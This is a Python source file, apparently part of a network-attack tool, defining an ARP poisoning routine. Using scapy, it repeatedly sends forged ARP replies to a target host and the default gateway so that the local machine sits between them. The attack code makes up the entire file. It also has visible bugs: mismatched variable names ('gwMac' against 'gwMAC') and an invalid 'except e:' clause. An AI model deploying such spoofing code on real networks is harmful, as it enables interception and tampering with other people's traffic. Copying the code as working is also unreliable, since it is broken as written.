from com.GUI import GUI

try:
    import time
    import socket
    import requests
    from scapy.config import conf
    from scapy.layers.inet import IP
    from scapy.layers.l2 import Ether, ARP, getmacbyip
    from scapy.sendrecv import srp, send
    from net.cmnNet import CmnNet
    from com.exceptions import NetworkException, InvalidIPv4Exception
    from com.programManager import programMgr
except ModuleNotFoundError as e:
    GUI.killWithNoDependencies(e)


class Attacks:
    @staticmethod
    def ARPpoison(dstIP, interval=7):
        try:
            # Default gateway IP and MAC
            gwIP = CmnNet.getDefaultGatewayIP()
            gwMAC = CmnNet.getMACByIP(gwIP)

            # Local IP and MAC
            lclIP = CmnNet.getLocalDefaultIP()
            lclMAC = CmnNet.getLocalDefaultMAC()

            # Target IP and MAC
            if not CmnNet.isValidIP(dstIP):
                raise InvalidIPv4Exception(dstIP)

            dstMAC = CmnNet.getMACByIP(dstIP)

            arpA = ARP(op=2, psrc=dstIP, hwsrc=lclMAC, pdst=gwIP, hwdst=gwMac)
            arpB = ARP(op=2, psrc=gwIP, hwsrc=lclMAC, pdst=dstIP, hwdst=dstMac)
        except e:
            raise e

        while True:
            try:
                send(arpA, iface=programMgr.mainNICName)
                send(arpB, iface=programMgr.mainNICName)
            except KeyboardInterrupt:
                exit(0)
            except:
                raise NetworkException()

            time.sleep(interval)
